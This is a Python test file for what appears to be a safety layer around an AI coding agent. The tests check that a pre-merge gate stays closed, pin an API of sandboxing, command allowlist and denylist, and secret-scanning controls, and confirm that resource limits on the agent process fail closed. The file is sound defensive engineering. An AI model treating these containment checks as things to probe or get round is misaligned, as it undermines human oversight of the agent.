    def test_pre_merge_gate_still_cannot_pass(self):
        """Merge stays closed by construction, not by a flag.

        Seven pre-merge checks are unimplemented, so the gate refuses
        even the cleanest action. When phase B lands this test must be
        rewritten deliberately — that is the point of asserting it.
        """
        with tempfile.TemporaryDirectory() as tmp:
            report = _is.run_hard_fail_checks(
                self._clean_context(Path(tmp)), gate=_is.GATE_PRE_MERGE
            )
            self.assertFalse(report.passed)
            self.assertTrue(
                all(r.reason == "check_not_implemented" for r in report.failures),
                "a pre-merge check failed for a reason other than being unbuilt: "
                + "; ".join(f"{r.name}: {r.reason}" for r in report.failures),
            )


class TestV9PublicApi(unittest.TestCase):

    def test_i_v9_safety_public_api_complete(self):
        """__all__ pin (prevent accidental sibling-symbol creep)."""
        canonical = {
            "READONLY_PATHS", "ALLOWED_BASH_COMMANDS", "DENIED_BASH_COMMANDS",
            "FORBIDDEN_GH_API_PATHS", "MAX_VALIDATION_RESULT_BYTES",
            "IMMUTABLE_AGENT_FILE_HASH_REGISTRY", "SECRET_SCAN_PATTERNS",
            "SecretLeakDetected", "PathEscape", "BashAllowlistMiss",
            "BashDenylistHit", "CommitSignatureMismatch",
            "verify_no_secret_in_diff", "verify_no_secret_in_envelope",
            "verify_commit_signature", "mint_unpredictable_feature_branch_name",
            "verify_no_path_escape", "verify_bash_command_allowed",
            "is_gh_api_path_forbidden", "wrap_bash_in_sandbox",
            "apply_resource_limits", "truncate_validation_result",
            "HardFailCheck", "HARD_FAIL_CHECKS",
            # ORPHAN-CRITICAL-427 — the sandbox contract is now typed:
            # wrap_bash_in_sandbox RAISES SandboxUnavailable rather than
            # returning bare argv, and sandbox_backend lets a caller fail
            # closed before it builds a command.
            "SandboxUnavailable", "sandbox_backend",
            # ORPHAN-HIGH-470 — the limiter contract is typed for the same
            # reason: apply_resource_limits RAISES rather than handing back
            # bare argv when no limiter is usable.
            "ResourceLimitsUnavailable",
            # ORPHAN-CRITICAL-428 — the perimeter is two gates, so the
            # stage names and the runner filter are public contract.
            "GATE_PRE_PR_OPEN", "GATE_PRE_MERGE", "HARD_FAIL_GATES",
            # ORPHAN-CRITICAL-428 phase A — the ARIA-branch grammar is
            # shared between the argv allowlist and the refspec check so
            # the two cannot disagree, and the canonical validation suite
            # is what the test gate requires an implementation to declare.
            "ARIA_IMPL_BRANCH_FRAGMENT", "CANONICAL_VALIDATION_COMMANDS",
        }
        self.assertEqual(
            set(_is.__all__), canonical,
            f"__all__ drifted; missing={canonical - set(_is.__all__)} extra={set(_is.__all__) - canonical}",
        )


if __name__ == "__main__":
    unittest.main()


class ResourceLimitSelectionTests(unittest.TestCase):
    """ORPHAN-HIGH-470 — limits are selected on capability, not presence.

    `apply_resource_limits` chose systemd-run whenever `shutil.which` found
    the binary. On any host without a user session bus — every container this
    runs in — /usr/bin/systemd-run exists and every invocation fails with
    "Failed to connect to bus: No medium found", so the wrapper contributed a
    guaranteed spawn failure instead of limits, and the working `timeout`
    branch below it was unreachable.
    """

    def test_a_present_but_broken_systemd_run_falls_through_to_timeout(self) -> None:
        from aria_kernel import implementation_safety as impl

        impl._systemd_run_available.cache_clear()
        try:
            with unittest.mock.patch.object(
                impl.shutil, "which", side_effect=lambda name: f"/usr/bin/{name}"
            ), unittest.mock.patch.object(
                impl, "_sandbox_probe_succeeds", return_value=False
            ):
                argv = impl.apply_resource_limits(["claude"], timeout_seconds=1800)
            self.assertEqual(argv[:2], ["timeout", "1800"])
        finally:
            impl._systemd_run_available.cache_clear()

    def test_a_working_systemd_run_bounds_wall_clock_with_runtimemaxsec(self) -> None:
        """TimeoutStopSec bounds how long systemd waits for a unit to die
        AFTER asking it to stop; it places no bound on how long the unit may
        run. The one limit the caller passes a value for was the one not
        being applied."""
        from aria_kernel import implementation_safety as impl

        impl._systemd_run_available.cache_clear()
        try:
            with unittest.mock.patch.object(
                impl.shutil, "which", side_effect=lambda name: f"/usr/bin/{name}"
            ), unittest.mock.patch.object(
                impl, "_sandbox_probe_succeeds", return_value=True
            ):
                argv = impl.apply_resource_limits(["claude"], timeout_seconds=1800)
            self.assertEqual(argv[0], "systemd-run")
            self.assertIn("--property=RuntimeMaxSec=1800", argv)
            self.assertNotIn(
                "--property=TimeoutStopSec=1800", argv,
                "TimeoutStopSec does not bound runtime",
            )
        finally:
            impl._systemd_run_available.cache_clear()

    def test_the_probe_carries_the_properties_the_wrapper_applies(self) -> None:
        """A host can accept systemd-run and reject an individual property, so
        a probe that omitted them would prove less than it appears to."""
        from aria_kernel import implementation_safety as impl

        probe = impl._systemd_run_probe_argv()
        for prop in ("MemoryMax=2G", "CPUQuota=200%", "TasksMax=50"):
            self.assertIn(f"--property={prop}", probe)
        self.assertTrue(any(p.startswith("--property=RuntimeMaxSec=") for p in probe))

    def test_no_usable_limiter_refuses_instead_of_spawning_unbounded(self) -> None:
        from aria_kernel import implementation_safety as impl

        impl._systemd_run_available.cache_clear()
        try:
            with unittest.mock.patch.object(impl.shutil, "which", return_value=None):
                with self.assertRaises(impl.ResourceLimitsUnavailable) as ctx:
                    impl.apply_resource_limits(["claude"], timeout_seconds=1800)
            self.assertIn("resource_limits_unavailable", str(ctx.exception))
        finally:
            impl._systemd_run_available.cache_clear()
